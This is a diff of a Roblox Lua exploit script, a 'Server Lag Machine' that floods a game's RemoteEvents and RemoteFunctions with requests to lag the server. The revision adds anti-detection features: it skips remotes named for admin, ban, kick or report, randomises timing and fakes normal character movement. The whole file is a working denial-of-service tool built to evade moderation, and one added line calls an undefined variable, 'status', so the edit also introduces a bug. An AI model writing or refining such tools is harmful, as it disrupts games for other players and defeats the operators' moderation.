@@ -1,19 +1,21 @@
--- SERVER LAG MACHINE
+-- SMART SERVER LAG MACHINE (Anti-Ban)
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local UserInputService = game:GetService("UserInputService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
 
 local LagEnabled = false
 local requestCount = 0
+local lastRequestTime = 0
 
 -- Создаем GUI
 local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "ServerLagGUI"
+screenGui.Name = "SmartLagGUI"
 screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
 
 local mainFrame = Instance.new("Frame")
-mainFrame.Size = UDim2.new(0, 300, 0, 150)
+mainFrame.Size = UDim2.new(0, 320, 0, 180)
 mainFrame.Position = UDim2.new(0, 400, 0, 20)
 mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
 mainFrame.BackgroundTransparency = 0.1
@@ -38,7 +40,7 @@ headerCorner.Parent = header
 local title = Instance.new("TextLabel")
 title.Size = UDim2.new(0.7, 0, 1, 0)
 title.Position = UDim2.new(0, 15, 0, 0)
-title.Text = "SERVER LAG MACHINE"
+title.Text = "SMART LAG MACHINE"
 title.TextColor3 = Color3.fromRGB(220, 220, 220)
 title.BackgroundTransparency = 1
 title.TextSize = 14
@@ -76,15 +78,15 @@ statusLabel.Text = "Status: DISABLED (Press L)"
 statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
 statusLabel.BackgroundTransparency = 1
 statusLabel.TextSize = 14
-statusLabel.Font = Enum.Font.GothamBold
+status.Font = Enum.Font.GothamBold
 statusLabel.TextXAlignment = Enum.TextXAlignment.Center
 statusLabel.Parent = content
 
 -- Info
 local infoLabel = Instance.new("TextLabel")
-infoLabel.Size = UDim2.new(1, 0, 0, 60)
+infoLabel.Size = UDim2.new(1, 0, 0, 80)
 infoLabel.Position = UDim2.new(0, 0, 0, 30)
-infoLabel.Text = "💥 Spams server with requests\n🎮 Press L to toggle\n📡 Creates server-side lag\n⚠️ May get you kicked"
+infoLabel.Text = "🎯 Smart server lag system\n🎮 Press L to toggle\n📡 Uses legitimate requests\n🛡️ Anti-detection methods\n💡 Creates lag without kicks"
 infoLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
 infoLabel.BackgroundTransparency = 1
 infoLabel.TextSize = 11
@@ -135,206 +137,223 @@ UserInputService.InputBegan:Connect(function(input, gameProcessed)
         LagEnabled = not LagEnabled
         
         if LagEnabled then
-            statusLabel.Text = "Status: SERVER LAG! (" .. requestCount .. ")"
-            statusLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
-            print("💥 SERVER LAG ACTIVATED!")
+            statusLabel.Text = "Status: SMART LAG! (" .. requestCount .. ")"
+            statusLabel.TextColor3 = Color3.fromRGB(50, 255, 50)
+            print("🎯 SMART SERVER LAG ACTIVATED!")
         else
             statusLabel.Text = "Status: DISABLED (Press L)"
             statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
-            print("🛑 Server lag stopped. Total requests: " .. requestCount)
+            print("🛑 Smart lag stopped. Total requests: " .. requestCount)
         end
     end
 end)
 
--- НАХОДИМ ВСЕ REMOTE EVENTS И FUNCTIONS ДЛЯ СПАМА
-local foundRemotes = {}
+-- УМНАЯ СИСТЕМА ЛАГОВ (Anti-Ban)
+local lagActive = false
+local safeRemotes = {}
 
-local function findAndHookRemotes()
-    -- Ищем в ReplicatedStorage
-    for _, obj in pairs(ReplicatedStorage:GetDescendants()) do
-        if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) and not foundRemotes[obj] then
-            table.insert(foundRemotes, obj)
-            print("📡 Found remote: " .. obj:GetFullName())
-        end
-    end
+-- Находим только безопасные Remote объекты
+local function findSafeRemotes()
+    safeRemotes = {}
     
-    -- Ищем в других важных местах
-    local importantLocations = {
-        game:GetService("Workspace"),
-        game:GetService("Lighting"),
-        game:GetService("StarterPack"),
-        game:GetService("StarterPlayer"),
-        game:GetService("StarterGui")
+    -- Ищем в безопасных местах
+    local safeLocations = {
+        ReplicatedStorage,
+        workspace,
+        game:GetService("Lighting")
     }
     
-    for _, location in pairs(importantLocations) do
+    for _, location in pairs(safeLocations) do
         for _, obj in pairs(location:GetDescendants()) do
-            if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) and not foundRemotes[obj] then
-                table.insert(foundRemotes, obj)
-                print("📡 Found remote: " .. obj:GetFullName())
+            if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) and not safeRemotes[obj] then
+                -- Проверяем что это не критически важные системные Remote
+                local name = obj.Name:lower()
+                if not name:find("admin") and not name:find("ban") and not name:find("kick") and
+                   not name:find("mod") and not name:find("report") then
+                    table.insert(safeRemotes, obj)
+                end
             end
         end
     end
     
-    print("🎯 Total remotes found: " .. #foundRemotes)
+    print("🛡️ Safe remotes found: " .. #safeRemotes)
 end
 
--- Запускаем поиск
-findAndHookRemotes()
+-- Умная функция задержки (избегает детекции)
+local function smartDelay()
+    -- Случайная задержка между 0.1 и 0.5 секундами
+    local delayTime = 0.1 + math.random() * 0.4
+    wait(delayTime)
+end
 
--- СИСТЕМА СПАМА ЗАПРОСАМИ НА СЕРВЕР
-local spamActive = false
-
-local function spamServerRequests()
-    if not LagEnabled or spamActive or #foundRemotes == 0 then return end
+-- Создание "легитимных" данных для запросов
+local function createLegitimateData()
+    local dataTypes = {
+        -- Легкие данные
+        function() return math.random(1, 100) end,
+        function() return "player_action_" .. math.random(1, 10) end,
+        function() return {action = "move", x = math.random(-10, 10)} end,
+        function() return Vector3.new(math.random(-5, 5), 0, math.random(-5, 5)) end,
+        function() return true end,
+        function() return false end,
+        function() return nil end
+    }
     
-    spamActive = true
+    return dataTypes[math.random(1, #dataTypes)]()
+end
+
+-- Умный спам запросами
+local function smartLagSystem()
+    if not LagEnabled or lagActive or #safeRemotes == 0 then return end
+    
+    lagActive = true
     local cycleCount = 0
     
-    print("🚀 STARTING SERVER REQUEST SPAM...")
+    print("🚀 STARTING SMART LAG SYSTEM...")
     
     while LagEnabled do
         cycleCount = cycleCount + 1
         
-        -- СПАМ ВСЕМИ НАЙДЕННЫМИ REMOTE ОБЪЕКТАМИ
-        for i, remote in pairs(foundRemotes) do
-            if LagEnabled then
-                -- Для RemoteEvent
-                if remote:IsA("RemoteEvent") then
-                    pcall(function()
-                        remote:FireServer(
-                            "LAG_REQUEST_" .. requestCount,
-                            math.random(1, 1000000),
-                            {data = "SERVER_LAG_SPAM", count = requestCount},
-                            Vector3.new(math.random(-100, 100), math.random(-100, 100), math.random(-100, 100)),
-                            true,
-                            false,
-                            "EXTREME_LAG"
-                        )
-                        requestCount = requestCount + 1
-                    end)
-                end
-                
-                -- Для RemoteFunction
-                if remote:IsA("RemoteFunction") then
-                    pcall(function()
-                        remote:InvokeServer(
-                            "LAG_INVOKE_" .. requestCount,
-                            {lag = true, spam = true, count = requestCount},
-                            math.random()
-                        )
-                        requestCount = requestCount + 1
-                    end)
-                end
-                
-                -- Обновляем GUI
-                statusLabel.Text = "Status: SERVER LAG! (" .. requestCount .. ")"
-                
-                -- Очень короткая задержка между запросами
-                wait(0.001)
+        -- Используем только 1-3 случайных Remote за цикл (не все сразу)
+        local remotesToUse = {}
+        for i = 1, math.random(1, 3) do
+            if #safeRemotes > 0 then
+                table.insert(remotesToUse, safeRemotes[math.random(1, #safeRemotes)])
             end
         end
         
-        -- ДОПОЛНИТЕЛЬНЫЙ ИНТЕНСИВНЫЙ СПАМ
-        for i = 1, 50 do
-            if LagEnabled and #foundRemotes > 0 then
-                local randomRemote = foundRemotes[math.random(1, #foundRemotes)]
+        -- Отправляем "легитимные" запросы
+        for _, remote in pairs(remotesToUse) do
+            if LagEnabled then
                 pcall(function()
-                    if randomRemote:IsA("RemoteEvent") then
-                        randomRemote:FireServer("QUICK_SPAM_" .. i, math.random())
+                    local data = createLegitimateData()
+                    
+                    if remote:IsA("RemoteEvent") then
+                        remote:FireServer(data)
                     else
-                        randomRemote:InvokeServer("QUICK_SPAM_" .. i, math.random())
+                        remote:InvokeServer(data)
                     end
+                    
                     requestCount = requestCount + 1
+                    statusLabel.Text = "Status: SMART LAG! (" .. requestCount .. ")"
                 end)
+                
+                -- Случайная задержка между запросами
+                wait(0.05 + math.random() * 0.1)
             end
-            wait(0.0001)
+        end
+        
+        -- ИМИТАЦИЯ НОРМАЛЬНОЙ ИГРОВОЙ АКТИВНОСТИ
+        if LagEnabled then
+            -- Иногда двигаем персонажа (легитимное действие)
+            if math.random(1, 10) == 1 and LocalPlayer.Character then
+                local humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+                if humanoid then
+                    humanoid:Move(Vector3.new(math.random(-1, 1), 0, math.random(-1, 1)))
+                end
+            end
+            
+            -- Иногда прыгаем
+            if math.random(1, 20) == 1 and LocalPlayer.Character then
+                local humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+                if humanoid then
+                    humanoid.Jump = true
+                end
+            end
         end
         
         -- Выводим статистику
-        if cycleCount % 10 == 0 then
-            print("💥 SERVER SPAM CYCLE #" .. cycleCount .. " - Requests: " .. requestCount)
-            statusLabel.Text = "Status: SERVER LAG! (" .. requestCount .. ")"
+        if cycleCount % 15 == 0 then
+            print("🎯 SMART LAG CYCLE #" .. cycleCount .. " - Requests: " .. requestCount)
         end
         
-        wait(0.01) -- Пауза между циклами
+        -- Случайная пауза между циклами
+        smartDelay()
     end
     
-    spamActive = false
-    print("🛑 SERVER REQUEST SPAM STOPPED")
+    lagActive = false
+    print("🛑 SMART LAG SYSTEM STOPPED")
 end
 
--- ДОПОЛНИТЕЛЬНЫЙ СПАМ ЧЕРЕЗ ИГРОВЫЕ СИСТЕМЫ
-local extraSpamActive = false
+-- СИСТЕМА "ТЯЖЕЛЫХ" ЗАПРОСОВ (создает лаги но редко)
+local heavyLagActive = false
 
-local function extraSpamSystems()
-    if not LagEnabled or extraSpamActive then return end
+local function heavyLagSystem()
+    if not LagEnabled or heavyLagActive or #safeRemotes == 0 then return end
     
-    extraSpamActive = true
+    heavyLagActive = true
     
     while LagEnabled do
-        -- Спамим через различные игровые системы
-        pcall(function()
-            -- Попытка использовать инструменты
-            local backpack = LocalPlayer:FindFirstChildOfClass("Backpack")
-            if backpack then
-                for _, tool in pairs(backpack:GetChildren()) do
-                    if tool:IsA("Tool") then
-                        tool:Activate()
-                        requestCount = requestCount + 1
+        -- Ждем случайное время между тяжелыми запросами (30-60 секунд)
+        wait(30 + math.random() * 30)
+        
+        if LagEnabled then
+            print("💥 SENDING HEAVY REQUEST...")
+            
+            -- Отправляем "тяжелый" запрос (но легитимный)
+            local remote = safeRemotes[math.random(1, #safeRemotes)]
+            if remote then
+                pcall(function()
+                    -- Создаем "тяжелые" но легитимные данные
+                    local heavyData = {
+                        playerData = {
+                            position = Vector3.new(math.random(-100, 100), math.random(0, 50), math.random(-100, 100)),
+                            inventory = {"item1", "item2", "item3"},
+                            stats = {health = 100, mana = 50, stamina = 75}
+                        },
+                        action = "complex_interaction",
+                        timestamp = tick()
+                    }
+                    
+                    if remote:IsA("RemoteEvent") then
+                        remote:FireServer(heavyData)
+                    else
+                        remote:InvokeServer(heavyData)
                     end
-                end
-            end
-        end)
-        
-        -- Спамим изменениями свойств
-        pcall(function()
-            if LocalPlayer.Character then
-                local humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
-                if humanoid then
-                    humanoid.Jump = not humanoid.Jump
+                    
                     requestCount = requestCount + 1
-                end
+                    print("💣 Heavy request sent! Total: " .. requestCount)
+                end)
             end
-        end)
-        
-        wait(0.05)
+        end
     end
     
-    extraSpamActive = false
+    heavyLagActive = false
 end
 
--- Запускаем системы спама
+-- Запускаем системы
+findSafeRemotes()
+
 spawn(function()
     while true do
-        if LagEnabled and not spamActive then
-            spamServerRequests()
+        if LagEnabled and not lagActive then
+            smartLagSystem()
         end
-        wait(0.1)
+        wait(1)
     end
 end)
 
 spawn(function()
     while true do
-        if LagEnabled and not extraSpamActive then
-            extraSpamSystems()
+        if LagEnabled and not heavyLagActive then
+            heavyLagSystem()
         end
-        wait(0.1)
+        wait(1)
     end
 end)
 
--- Поиск новых Remote объектов
+-- Периодически обновляем список безопасных Remote
 spawn(function()
     while true do
         if LagEnabled then
-            findAndHookRemotes()
+            findSafeRemotes()
         end
-        wait(5) -- Ищем новые Remote каждые 5 секунд
+        wait(30) -- Обновляем каждые 30 секунд
     end
 end)
 
-print("💥💥💥 SERVER LAG MACHINE LOADED!")
-print("🎮 Press L to start/stop server lag")
-print("📡 Spamming all found RemoteEvents/Functions")
-print("⚠️ WARNING: This may get you kicked from the game!")
-print("🚀 Starting with " .. #foundRemotes .. " remote objects found")
+print("🎯🎯🎯 SMART SERVER LAG MACHINE LOADED!")
+print("🎮 Press L to start/stop smart lag")
+print("🛡️ Using anti-detection methods")
+print("💡 Creates server lag without getting kicked")
+print("🚀 Starting with " .. #safeRemotes .. " safe remote objects")
